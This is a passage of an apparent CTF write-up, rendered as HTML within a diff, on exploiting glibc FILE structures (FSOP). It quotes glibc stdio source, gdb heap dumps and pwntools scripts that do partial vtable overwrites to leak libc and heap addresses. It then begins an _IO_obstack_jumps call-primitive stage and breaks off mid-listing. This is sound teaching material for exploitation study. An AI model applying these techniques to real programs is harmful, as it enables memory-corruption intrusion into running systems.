+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span><span class="p">;</span>
+	    <span class="p">}</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	  <span class="n">_IO_switch_to_backup_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="p">}</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="cm">/* Increase size of existing backup buffer. */</span>
+	  <span class="n">size_t</span> <span class="n">new_size</span><span class="p">;</span>
+	  <span class="n">size_t</span> <span class="n">old_size</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
+	  <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+	  <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_size</span><span class="p">;</span>
+	  <span class="n">new_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+            <span class="cm">/* we should return there 
+</span><span class="cm">            (fp-&gt;_IO_read_end == fp-&gt;_IO_read_base), 
+</span><span class="cm">            new_size == 0, new_buf == NULL.
+</span><span class="cm">            */</span>
+            <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">),</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">,</span>
+		  <span class="n">old_size</span><span class="p">);</span>
+	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">);</span>
+	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">new_buf</span><span class="p">,</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">),</span>
+		    <span class="n">new_buf</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">);</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	<span class="p">}</span>
+
+      <span class="o">*--</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">c</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_default_pbackfail</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+</div>
+
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="c19e7e1e-10">
+    <span>fp state after the _IO_new_file_underflow</span>
+    <span>...</span>
+  </label>
+  <input id="c19e7e1e-10" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad9888      0x00005649e8077480
+0x5649e80772b0: 0x00005649e8077480      0x00005649e8077480
+0x5649e80772c0: 0x00005649e8077480      0x00005649e8077480
+0x5649e80772d0: 0x00005649e8079480      0x00005649e8077480
+0x5649e80772e0: 0x00005649e8079480      0x00005649e8077480
+0x5649e80772f0: 0x00005649e8079510      0x00005649e8077480
+0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
+0x5649e8077310: 0x0000000000000001      0x0000000000000000
+0x5649e8077320: 0x0000000000000000      0x00005649e8077380
+0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
+0x5649e8077340: 0x0000000000000000      0x0000000000000000
+0x5649e8077350: 0x0000000000000000      0x0000000000000000
+0x5649e8077360: 0x0000000000000000      0x0000000000000000
+0x5649e8077370: 0x0000000000000000      0x00007f4092dc44a0
+0x5649e8077380: 0x0000000000000000      0x0000000000000000
+</code></pre>
+  </div>
+</div>
+
+<p>Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at <code>fp-&gt;_IO_base_buffer &amp; ~0xff</code> (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:</p>
+<pre tabindex="0"><code>0x5649e8077400: 0x0000000000000000      0x0000000000000000
+0x5649e8077410: 0x0000000000000000      0x0000000000000000
+0x5649e8077420: 0x0000000000000000      0x0000000000000000
+0x5649e8077430: 0x0000000000000000      0x0000000000000000
+0x5649e8077440: 0x0000000000000000      0x0000000000000000
+0x5649e8077450: 0x0000000000000000      0x0000000000000000
+0x5649e8077460: 0x0000000000000000      0x0000000000000000
+0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011
+0x5649e8077480: 0x0000000000000000      0x0000000000000000
+0x5649e8077490: 0x0000000000000000      0x0000000000000000
+</code></pre><p>Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of <code>_IO_fflush</code>:
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="792f4368-11">
+    <span>_IO_fflush</span>
+    <span>...</span>
+  </label>
+  <input id="792f4368-11" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_fflush</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">_IO_flush_all</span> <span class="p">();</span>
+  <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+      <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">_IO_SYNC</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fflush</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+</div>
+</p>
+<p>It ends up calling <code>_IO_new_file_sync(fp)</code>:
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="3c3692bb-12">
+    <span>_IO_new_file_sync</span>
+    <span>...</span>
+  </label>
+  <input id="3c3692bb-12" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_new_file_sync</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ssize_t</span> <span class="n">delta</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="cm">/*    char* ptr = cur_ptr(); */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="n">delta</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">off64_t</span> <span class="n">new_pos</span> <span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">delta</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">!=</span> <span class="p">(</span><span class="n">off64_t</span><span class="p">)</span> <span class="n">EOF</span><span class="p">)</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ESPIPE</span><span class="p">)</span>
+	<span class="p">;</span> <span class="cm">/* Ignore error from unseekable devices. */</span>
+      <span class="k">else</span>
+	<span class="n">retval</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
+  <span class="cm">/* FIXME: Cleanup - can this be shared? */</span>
+  <span class="cm">/*    setg(base(), ptr, ptr); */</span>
+  <span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_sync</span><span class="p">,</span> <span class="n">_IO_file_sync</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+</div>
+</p>
+<p>I already talked about the way we can gain arbitrary read with FSOP attack on <code>stdout</code> in <a
+  class="gblog-markdown__link"
+  href="../catastrophe"
+  
+  >this article</a
+>. The way we will get a leak is almost the same, first we need to trigger the first condition in <code>_IO_new_file_sync</code> in such a way that <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> which will trigger <code>_IO_do_flush(fp)</code>. Then <code>_IO_do_flush</code> triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="f7d5a6cb-13">
+    <span>_IO_do_flush</span>
+    <span>...</span>
+  </label>
+  <input id="f7d5a6cb-13" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _IO_do_flush(_f) \
+</span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
+</span><span class="cp">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
+</span><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
+</span><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
+</span><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
+</span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
+</span></code></pre></div>
+  </div>
+</div>
+
+<p><strong>Condition</strong>:
+<code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</code> &gt;= <code>sizeof(uint8_t* )</code>, <code>(_f)-&gt;_IO_write_base</code> == <code>target</code>.</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="74588d8a-14">
+    <span>_IO_do_write</span>
+    <span>...</span>
+  </label>
+  <input id="74588d8a-14" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
+	  <span class="o">||</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+</div>
+
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="1e22ae62-15">
+    <span>new_do_write</span>
+    <span>...</span>
+  </label>
+  <input id="1e22ae62-15" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">size_t</span>
+<span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">size_t</span> <span class="n">count</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
+    <span class="cm">/* On a system without a proper O_APPEND implementation,
+</span><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
+</span><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
+</span><span class="cm">       Instead, just indicate that offset (before and after) is
+</span><span class="cm">       unpredictable. */</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">off64_t</span> <span class="n">new_pos</span>
+	<span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="p">)</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="n">_IO_adjust_column</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
+		       <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
+		       <span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_IO_buf_base</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+  </div>
+</div>
+
+<p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is equal to <code>_IO_buf_base</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
+<p>The leak phase gives for me something like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># do_allocate</span>
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+<span class="n">fflush</span><span class="p">()</span>
+
+<span class="c1"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x60</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+<span class="n">fflush</span><span class="p">()</span>
+
+<span class="s2">&#34;&#34;&#34;
+</span><span class="s2">int
+</span><span class="s2">_IO_default_pbackfail (FILE *fp, int c)
+</span><span class="s2">=&gt; not _IO_IN_BACKUP         0x0100
+</span><span class="s2">=&gt; _IO_read_base == _IO_write_ptr
+</span><span class="s2">=&gt; _IO_read_end == _IO_write_ptr + 8
+</span><span class="s2">=&gt; _IO_write_end = right size
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>
+
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
+
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x78</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">fileno</span><span class="p">)</span>
+<span class="n">fflush</span><span class="p">()</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2160c0</span> <span class="o">+</span> <span class="mh">0x2d160</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="heap-leak">
+        Heap leak
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap leak" href="#heap-leak">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>To use the <code>_IO_obstack_jumps</code> technique, we have to craft a custom <code>obstack</code> structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that very easy, within the <code>main_arena</code> are stored some heap pointers, which means we just have to use the same <code>_IO_fflush</code> trick to flush the filestream and then leak a heap pointer stored in the <code>main_arena</code>. I wrote a function that leaks directly the right pointer from a given address:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">leak_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">    We assume flags are right
+</span><span class="s2">    &#34;&#34;&#34;</span>
+
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
+    
+    <span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+
+    <span class="n">fflush</span><span class="p">()</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="s2">&#34;&#34;&#34;
+</span><span class="s2">[...]
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="n">leak_main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1ed5a0</span>
+
+<span class="n">heap</span> <span class="o">=</span> <span class="n">leak_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_main_arena</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2a0</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="obstack-exploitation">
+        obstack exploitation
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#obstack-exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor obstack exploitation" href="#obstack-exploitation">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>As far I know, <code>obstack</code> has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the <code>_IO_obstack_jumps</code> vtable looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* the jump table.  */</span>
+<span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_obstack_jumps</span> <span class="n">libio_vtable</span> <span class="n">attribute_hidden</span> <span class="o">=</span>
+<span class="p">{</span>
+    <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_obstack_overflow</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_obstack_xsputn</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
